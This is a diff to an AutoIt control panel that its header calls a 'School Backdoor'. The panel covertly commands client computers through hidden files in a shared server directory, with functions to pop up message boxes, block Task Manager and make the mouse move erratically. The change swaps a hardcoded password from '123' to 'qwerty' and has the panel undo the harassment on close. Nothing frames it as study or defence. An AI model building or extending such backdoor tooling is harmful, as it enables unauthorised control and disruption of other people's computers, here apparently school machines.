@@ -2,7 +2,7 @@
 
  Devil ControlPanel ( School Backdoor )
  AutoIt Version: 3.3.14.2
- Version: Alpha (21:12 7.09.2017)
+ Version: Beta ( 18:55 8.09.2017)
 
 #ce ----------------------------------------------------------------------------
 
@@ -20,7 +20,7 @@
 _Singleton("devil_check_controlpanel", 0)
 
 ; Variables
-Local $Password = "123" ; There must be a password for accessing the command panel!
+Local $Password = "qwerty" ; There must be a password for accessing the command panel!
 Global $ClientID = ""
 
 ; Exit hotkey
@@ -68,7 +68,7 @@ While True
 	$GUICommand = GUIGetMsg()
 	Switch $GUICommand
 		Case $GUI_EVENT_CLOSE
-			Exit
+			FastClosing()
         Case $ShowMessageBox_Button
             LockGUI()
             ShowMessageBox()
@@ -101,6 +101,8 @@ While True
             LockGUI()
             DisableBlockTaskManager()
             UnLockGUI()
+        Case $Text
+            GUICtrlSetData($InputBox, "PublicData")
 	EndSwitch
 WEnd
 
@@ -183,7 +185,7 @@ Func LoadFile()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(3000) 
+        Sleep(1000) 
     EndIf
 EndFunc
 
@@ -291,5 +293,8 @@ EndFunc
 
 ; Exit
 Func FastClosing()
+    GUICtrlSetData($InputBox, "PublicData")
+    DisableCrazyMouse()
+    DisableBlockTaskManager()
     Exit
 EndFunc
